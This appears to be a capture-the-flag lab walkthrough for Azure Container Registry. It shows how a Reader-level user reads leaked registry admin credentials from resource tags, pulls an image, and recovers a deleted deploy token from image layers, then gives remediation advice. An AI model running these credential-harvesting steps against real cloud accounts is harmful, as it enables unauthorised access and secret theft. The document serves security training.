# ACR Image Secrets — Leaked Admin Creds → Secrets Baked Into an Image

**Provider:** Azure | **Category:** Containers / Secrets

## Scenario

A team runs a **private Azure Container Registry (ACR)** with the **admin account
enabled**. For convenience, someone tagged a "CI/CD artifact cache" storage
account with the registry's admin username and password — so those powerful
static credentials are now readable by anyone with **Reader** on the resource
group.

The application image pushed to that registry was built carelessly: a secret was
embedded at build time and then "removed" in a later layer. Deleting a file in a
later Dockerfile step does **not** remove it from the image — every layer is
retained and ships with the image.

Unlike the `container_instance_env` / `container_app_env_vars` labs (where the
secret sits in the **ARM control plane** and you just `az ... show` it), here you
must actually **pull and dissect a container image**.

## Attack Path

```
[Attacker] Azure AD user (Reader on resource group)
    |
    v
read resource tags  -->  ACR admin username + password (leaked on the storage account)
    |
    v
docker login <registry>.azurecr.io  -->  docker pull cumulonimbus/app:latest
    |
    +--> docker run -it ... sh      -->  /app/config/app.config  (DECOY: rotated token)
    |
    v
docker history --no-trunc / docker save  -->  deleted layer  -->  DEPLOY_TOKEN = flag
```

### Step 1 — Login as the attacker

```bash
az login --username <attacker_upn> --password <attacker_password>
```

### Step 2 — Discover the registry and the leaked credentials

```bash
RESOURCE_GROUP="<resource_group_name>"

# Enumerate the resource group — note the container registry and the storage account.
az resource list --resource-group "${RESOURCE_GROUP}" -o table

# A plain Reader cannot run `az acr credential show` (that needs listCredentials).
# But the credentials were left in the storage account's tags:
az resource show \
  --resource-group "${RESOURCE_GROUP}" \
  --name "<leak_storage_account>" \
  --resource-type Microsoft.Storage/storageAccounts \
  --query tags
```

You'll get the registry login server, `ci-registry-username`, and
`ci-registry-password`.

### Step 3 — Authenticate to the registry and pull the image

```bash
docker login <login-server> -u <ci-registry-username> -p <ci-registry-password>
docker pull <login-server>/cumulonimbus/app:latest
```

### Step 4 — Run it interactively (find the decoy + the breadcrumb)

```bash
docker run --rm -it <login-server>/cumulonimbus/app:latest sh
cat /app/config/app.config
```

This reveals `legacy_deploy_token=CUMULONIMBUS{...}` — but read the note: it's an
**old, rotated** value (a decoy), and the real token was removed in a later build
step.

### Step 5 — Recover the real secret from the deleted layer

The credential was written to `/root/.deploy_token` in one layer and `rm`'d in
the next. It's gone from the running filesystem but still in the image:

```bash
# Quickest: the build command itself is preserved in the image history.
docker history --no-trunc <login-server>/cumulonimbus/app:latest | grep -i deploy_token

# Or extract the layers and grep them:
docker save <login-server>/cumulonimbus/app:latest -o image.tar
mkdir image && tar -xf image.tar -C image
grep -rao 'CUMULONIMBUS{[^}]*}' image/
```

The `DEPLOY_TOKEN` value is the flag.

> No Docker handy? You can do the same with registry tooling, e.g.
> `crane export <login-server>/cumulonimbus/app:latest - | tar -tv` and
> `crane config <login-server>/cumulonimbus/app:latest` (history), or `oras`.

## How to Fix in Production

1. **Disable the ACR admin account** (`admin_enabled = false`) and use Azure AD /
   token-based, least-privilege access (e.g. `AcrPull` scoped to a managed
   identity).
2. **Never store registry credentials in resource tags** (or anywhere a Reader
   can see). Tags are not a secret store.
3. **Don't bake secrets into images.** Inject them at runtime (Key Vault, mounted
   secrets) and use multi-stage builds / `--secret` mounts so nothing lands in a
   layer. Deleting a file in a later step does not remove it from earlier layers.
4. **Scan images** for secrets in CI (trivy, trufflehog, `docker history`
   review) before they reach a registry.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Unsecured Credentials: Credentials in Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) |
| Implant Internal Image | [T1525](https://attack.mitre.org/techniques/T1525/) |
| Container and Resource Discovery | [T1613](https://attack.mitre.org/techniques/T1613/) |
